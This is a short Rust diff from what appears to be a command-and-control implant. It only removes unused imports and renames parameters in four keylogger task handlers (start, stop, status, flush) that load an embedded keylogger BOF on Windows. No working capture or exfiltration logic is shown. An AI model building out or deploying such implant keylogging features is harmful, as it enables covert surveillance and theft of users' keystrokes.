@@ -1,7 +1,7 @@
 use nexus_common::*;
 use std::process::Command;
 use base64::{Engine as _, engine::general_purpose};
-use log::{info, warn, debug, error};
+use log::{info, warn, error};
 
 #[cfg(target_os = "windows")]
 use crate::fiber_execution::FiberExecutor;
@@ -12,8 +12,6 @@ use nexus_infra::bof_loader::{BOFLoader, BofArgument, LoadedBof};
 #[cfg(target_os = "windows")]
 use std::sync::{Arc, Mutex};
 
-#[cfg(target_os = "windows")]
-use std::ffi::c_void;
 
 // Embedded keylogger BOF data (will be populated by build system)
 #[cfg(target_os = "windows")]
@@ -437,9 +435,7 @@ impl TaskExecutor {
 
     // Keylogger BOF execution methods
     #[cfg(target_os = "windows")]
-    async fn execute_keylogger_start(&self, task_data: &TaskData) -> Result<String> {
-        use std::ffi::CString;
-        
+    async fn execute_keylogger_start(&self, _task_data: &TaskData) -> Result<String> {        
         info!("Starting keylogger BOF");
         
         let mut state = self.keylogger_state.lock().map_err(|e| {
@@ -501,7 +497,7 @@ impl TaskExecutor {
     }
 
     #[cfg(target_os = "windows")]
-    async fn execute_keylogger_stop(&self, task_data: &TaskData) -> Result<String> {
+    async fn execute_keylogger_stop(&self, _task_data: &TaskData) -> Result<String> {
         info!("Stopping keylogger BOF");
         
         let mut state = self.keylogger_state.lock().map_err(|e| {
@@ -542,7 +538,7 @@ impl TaskExecutor {
     }
 
     #[cfg(target_os = "windows")]
-    async fn execute_keylogger_status(&self, task_data: &TaskData) -> Result<String> {
+    async fn execute_keylogger_status(&self, _task_data: &TaskData) -> Result<String> {
         info!("Getting keylogger status");
         
         let state = self.keylogger_state.lock().map_err(|e| {
@@ -573,7 +569,7 @@ impl TaskExecutor {
     }
 
     #[cfg(target_os = "windows")]
-    async fn execute_keylogger_flush(&self, task_data: &TaskData) -> Result<String> {
+    async fn execute_keylogger_flush(&self, _task_data: &TaskData) -> Result<String> {
         info!("Flushing keylogger data");
         
         let state = self.keylogger_state.lock().map_err(|e| {
